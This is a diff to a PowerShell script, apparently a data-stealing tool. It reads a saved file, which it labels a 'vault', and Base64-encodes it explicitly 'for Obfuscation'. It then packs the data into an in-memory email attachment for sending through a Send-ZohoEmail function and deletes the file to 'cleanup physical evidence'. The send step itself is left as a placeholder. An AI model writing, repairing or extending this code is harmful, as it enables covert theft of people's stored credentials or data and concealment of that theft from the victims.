@@ -134,27 +134,34 @@ function Send-ZohoEmail {
         Start-Sleep -Seconds 2 # Wait a moment for the file to save
         Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
-# if (Test-Path $outputFilePath) {
-#     $rawData = Get-Content $outputFilePath | Out-String
-#     Start-Sleep -Seconds 2
-#     Remove-Item $outputFilePath -Force
-# }
-Start-Sleep -Seconds 2
+if (Test-Path $outputFilePath) {
+    $rawData = Get-Content $outputFilePath -Raw
+    
+    # 2. Convert to Base64 for Obfuscation
+    $b64Bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
+    $b64String = [System.Convert]::ToBase64String($b64Bytes)
 
-$rawData = Get-Content "$env:TEMP\data.txt" | Out-String
+    # 3. Setup Memory Stream
+    $ms = New-Object System.IO.MemoryStream
+    $writer = New-Object System.IO.StreamWriter($ms)
+    $writer.Write($b64String)
+    $writer.Flush()
+    $ms.Position = 0
 
-# 4. Obfuscate the data using Base64
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
-$b64String = [System.Convert]::ToBase64String($bytes)
+    # 4. Create Attachment (Fixed line)
+    $attachment = New-Object Net.Mail.Attachment($ms, "encoded_vault.txt")
 
-# 5. Create a Memory Stream from the scrambled data
-$ms = New-Object System.IO.MemoryStream
-$writer = New-Object System.IO.StreamWriter($ms)
-$writer.Write($b64String)
-$writer.Flush()
-$ms.Position = 0
+    # 5. Send Email Logic here...
+    
+    # 6. Cleanup physical evidence
+    $attachment.Dispose()
+    $ms.Dispose()
+    Remove-Item $outputFilePath -Force
+} else {
+    Write-Host "Error: Save-As operation failed. Data file not found." -ForegroundColor Red
+}
 
-Start-Sleep -Seconds 2
+
 
 # 6. Create the Email Attachment (exists only in RAM)
 $attachment = New-Object Net.Mail.Attachment($ms, "$env:TEMP\data.txt")
